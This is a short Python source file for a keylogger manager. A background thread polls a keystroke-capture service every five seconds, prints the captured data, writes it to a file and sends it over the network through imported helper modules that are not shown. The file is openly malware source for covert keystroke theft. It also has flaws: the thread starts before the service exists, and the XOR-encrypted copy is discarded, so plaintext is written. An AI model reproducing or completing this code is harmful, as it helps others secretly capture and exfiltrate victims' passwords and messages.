import threading
import time
from key_logger_service import KeyLoggerService
from file_writer import FileWriter
from network_writer import NetworkWriter
from encryptor import  Encryptor

class KeyLoggerManager:

    def __init__(self):
        self.key_logger_thread = threading.Thread(target=self._get_data_from_key_logger)
        self.key_logger_thread.start()
        self.keylogger_service =KeyLoggerService()
        self.file_writer = FileWriter()
        self.network_writer = NetworkWriter()
        self.encryptor = Encryptor()
        self.data = None

    def _get_data_from_key_logger(self):
        while True:
            time.sleep(5)
            data = self.keylogger_service.get_data()
            encrypt_data = self.encryptor.xor(data)
            print(data)
            self.file_writer.write(data)
            self.network_writer.write(data)

    def exit(self):
        self.key_logger_thread.join()

key = KeyLoggerManager()
